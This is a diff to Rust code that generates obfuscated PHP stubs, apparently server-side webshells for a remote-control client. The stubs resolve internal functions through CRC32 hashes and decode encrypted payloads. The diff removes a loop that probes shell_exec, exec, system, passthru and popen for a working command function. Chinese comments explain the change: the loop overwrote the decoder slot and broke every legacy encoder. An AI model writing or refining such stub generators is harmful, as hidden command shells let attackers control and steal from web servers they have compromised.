@@ -197,6 +197,13 @@ pub fn business_php_stub(symbols: &[(usize, &str)], unpack_body: &str, exec_body
     for (index, name) in symbols {
         table.push_str(&format!("    '{}' => {index},\n", crc32b_hash(name)));
     }
+    // 注意：符号表里**不能**再写「执行器降级」覆盖 $_g[0]。business 模板的
+    // $_g[0] 属于调用方传入的第一个符号（base64_decode / openssl_decrypt），
+    // 覆盖后解包函数会去调用 shell_exec(密文) 并返回空 —— 实测表现为
+    // `{"code":200,"rule_size":0}`，客户端报「响应中未找到协议帧」。
+    // 8 个 legacy 编码器曾因此全部不可用（session 模板已先修过同一个坑）。
+    // 命令函数降级链由发送的代码自行探测（php_impl::PHP_EXEC_IMPL），
+    // 不依赖 stub 预置。
     let symbols_block = format!(
         r#"
 // 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
@@ -208,12 +215,6 @@ $_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
 foreach ($_fn as $_n) {{
     $_h = hash('crc32b', $_n);
     if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
-}}
-// 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
-// 按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
-// proc_open 需 3 参数不兼容单参数调用，排除）
-foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen') as $_c) {{
-    if (function_exists($_c)) {{ $_g[0] = $_c; break; }}
 }}
 "#
     );
@@ -1355,12 +1356,10 @@ foreach ($_fn as $_n) {
     $_h = hash('crc32b', $_n);
     if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
 }
-// 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
-// 按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
-// proc_open 需 3 参数不兼容单参数调用，排除）
-foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen') as $_c) {
-    if (function_exists($_c)) { $_g[0] = $_c; break; }
-}
+// 注意：这里**不能**写「执行器降级」覆盖 $_g[0] —— 本 stub 的 $_g[0]
+// 是 base64_decode（解包用），覆盖后解包会去调用 shell_exec(密文) 并返回空，
+// 表现为客户端报「响应中未找到协议帧」。命令函数降级链由发送的代码自行探测
+// （php_impl::PHP_EXEC_IMPL），不依赖 stub 预置。
 
 function __PREFIX__dec($hex, $key) {
     $out = '';
